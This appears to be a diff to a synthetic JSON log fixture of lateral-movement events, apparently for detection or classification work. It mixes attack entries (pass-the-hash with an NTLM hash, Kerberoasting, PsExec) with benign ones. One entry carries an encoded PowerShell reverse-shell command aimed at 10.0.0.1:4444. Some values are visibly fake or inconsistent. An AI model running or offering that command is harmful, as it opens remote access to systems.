@@ -1,48 +1,66 @@
 {
   "stage": "Lateral_Movement",
   "ip_pool": [
-    "192.168.1.10",
-    "192.168.1.11",
-    "192.168.1.12",
-    "192.168.1.13",
-    "192.168.1.14",
-    "192.168.1.15"
+    "10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4",
+    "10.0.0.5", "10.0.0.6", "10.0.0.7", "10.0.0.8",
+    "10.0.0.9", "10.0.0.10", "10.0.0.11", "10.0.0.12"
   ],
   "entries": [
     {
-      "src_ip": "192.168.1.10",
-      "dst_ip": "192.168.1.11",
+      "src_ip": "10.0.0.1",
+      "dst_ip": "10.0.0.254",
       "protocol": "SMB",
-      "payload_summary": "Pass-the-hash authentication attempt on ADMIN$",
-      "flags": ["AUTH", "NTLM"]
+      "payload_summary": "04/08-14:41:03.221 SMB2 SessionSetup NTLMSSP_AUTH | NTLM hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c | Target: ADMIN$ share | [**] [1:2023084:5] ET EXPLOIT Possible NTLM Relay Attack",
+      "flags": ["AUTH", "NTLM", "LATERAL"]
     },
     {
-      "src_ip": "192.168.1.10",
-      "dst_ip": "192.168.1.12",
+      "src_ip": "10.0.0.2",
+      "dst_ip": "10.0.0.254",
       "protocol": "RDP",
-      "payload_summary": "Remote desktop login with stolen credentials",
-      "flags": ["AUTH"]
+      "payload_summary": "RDP NLA auth from non-standard hour (02:41 UTC) | User: svc_backup | Src: 10.0.0.2 | Credssp NegoToken b64: YIIJ... [truncated 4096 bytes] | 3 failed attempts preceding success",
+      "flags": ["AUTH", "OFFHOURS"]
     },
     {
-      "src_ip": "192.168.1.11",
-      "dst_ip": "192.168.1.13",
+      "src_ip": "10.0.0.3",
+      "dst_ip": "10.0.0.254",
       "protocol": "WMI",
-      "payload_summary": "WMI remote execution of PowerShell payload",
-      "flags": ["EXEC"]
+      "payload_summary": "WMI ExecMethod Win32_Process.Create: cmd /c powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkA | Decoded: reverse shell to 10.0.0.1:4444",
+      "flags": ["EXEC", "ENCODED", "REVSHELL"]
     },
     {
-      "src_ip": "192.168.1.12",
-      "dst_ip": "192.168.1.14",
+      "src_ip": "10.0.0.4",
+      "dst_ip": "10.0.0.254",
       "protocol": "SSH",
-      "payload_summary": "SSH lateral hop using harvested private key",
-      "flags": ["AUTH", "KEY"]
+      "payload_summary": "SSH key auth: RSA 2048 fingerprint SHA256:kI3GnSKpOSMbFdIaFakEfakeKEY+notreal/AAAA | User: root | From: 10.0.0.4 | Key not in authorized_keys baseline | First seen: this session",
+      "flags": ["AUTH", "KEY", "ANOMALY"]
     },
     {
-      "src_ip": "192.168.1.13",
-      "dst_ip": "192.168.1.15",
+      "src_ip": "10.0.0.5",
+      "dst_ip": "10.0.0.254",
       "protocol": "TCP",
-      "payload_summary": "PsExec service installation on remote host",
-      "flags": ["SYN", "EXEC"]
+      "payload_summary": "Scheduled backup job: rsync -avz /var/data/ backup.corp.local::archives | 2.3GB transferred | Duration: 14min | Matches weekly backup schedule (Tue 02:30 UTC) | Cert: corp-ca signed",
+      "flags": []
+    },
+    {
+      "src_ip": "10.0.0.6",
+      "dst_ip": "10.0.0.254",
+      "protocol": "SMB",
+      "payload_summary": "SMB2 TreeConnect to \\\\fileserver\\HR_Docs | User: hr_admin | Read 847 files in 3min | Normal business hours (09:15 UTC) | Access pattern matches historical baseline",
+      "flags": []
+    },
+    {
+      "src_ip": "10.0.0.7",
+      "dst_ip": "10.0.0.254",
+      "protocol": "TCP",
+      "payload_summary": "PsExec PSEXESVC service install: \\\\10.0.0.7\\ADMIN$\\PSEXESVC.exe | SHA256: d7f40a82c2a7e5b3c1f9e4a6b8d2c5e7 (known PsExec binary) | Executed by: CORP\\svc_deploy (service account)",
+      "flags": ["EXEC", "PSEXEC"]
+    },
+    {
+      "src_ip": "10.0.0.8",
+      "dst_ip": "10.0.0.254",
+      "protocol": "KERBEROS",
+      "payload_summary": "Kerberoasting: TGS-REQ for SPN HTTP/webserver.corp.local | Encryption: RC4-HMAC (downgraded from AES256) | [**] [1:2027758:1] ET ATTACK_RESPONSE Kerberoasting Activity Detected | Ticket hash: $krb5tgs$23$*...",
+      "flags": ["KERBEROAST", "DOWNGRADE"]
     }
   ]
 }
